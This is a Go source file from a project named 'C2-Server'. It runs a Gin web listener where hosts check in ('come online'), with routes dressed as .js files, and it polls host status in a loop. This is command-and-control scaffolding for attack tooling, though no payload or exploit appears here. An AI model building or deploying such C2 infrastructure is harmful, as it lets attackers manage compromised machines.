package cmd

import (
	"C2-Server/clientApi"
	"C2-Server/config"
	"C2-Server/middle"
	"C2-Server/sql3"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"time"
)

func init() {
	//
}
func Check() {
	fmt.Println("监控主机状态中...")
	for {
		sql3.CheckHostStatus()
		time.Sleep(2 * time.Second)
	}

}
func RunHostServer()  {
	//用于启动主机上线的接口
	server_address:=config.HostServer_Ip+":"+config.HostServer_Port
	r := gin.Default()
	r.Use(middle.Cors()) //解决跨域问题
	v1 := r.Group(config.Hosts_Api+"/Hosts") //v1J接口
	{
		v1.GET("/Status.js", func(c *gin.Context) {
			c.String(http.StatusOK, "Client_server_ok is ok")
		})
	}
	v1_host_api:=r.Group(config.Hosts_Api+"/Hosts")
	{
		v1_host_api.POST("/*action", clientApi.Online)  //接口类型
		//v1_host_api.POST("/AddHost.js", clientApi.AddHosts) //主机上线

	}
	fmt.Print("Client_Server is Runing....\nYou Can See http://"+server_address+config.Hosts_Api+"/Hosts/Status  to check your ClientServer!\n")
	go Check()
	r.Run(config.HostServer_Ip+":"+config.HostServer_Port)
}